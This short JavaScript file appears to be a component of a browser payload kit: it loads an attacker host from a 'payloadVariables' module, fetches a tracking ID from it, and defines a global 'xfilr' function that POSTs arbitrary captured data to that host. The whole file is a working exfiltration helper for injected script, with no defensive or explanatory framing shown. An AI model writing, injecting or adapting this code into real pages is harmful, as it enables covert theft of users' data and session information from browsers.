const { CSIK_HOST } = require('../../payloadVariables')
window.x_id = 'not-sup';
window.xfilr = (function() {
  fetch(CSIK_HOST + '/id')
      .then(function(res) {
    return res.json();
  })
      .then(function(jsonRes) {
    window.x_id = jsonRes.val;
  });
  return function(type, payload) {
    fetch(`${CSIK_HOST}/${type}?i=${window.x_id}`,
        {
            method: 'POST',
            body: JSON.stringify(payload)
        });
  }
})();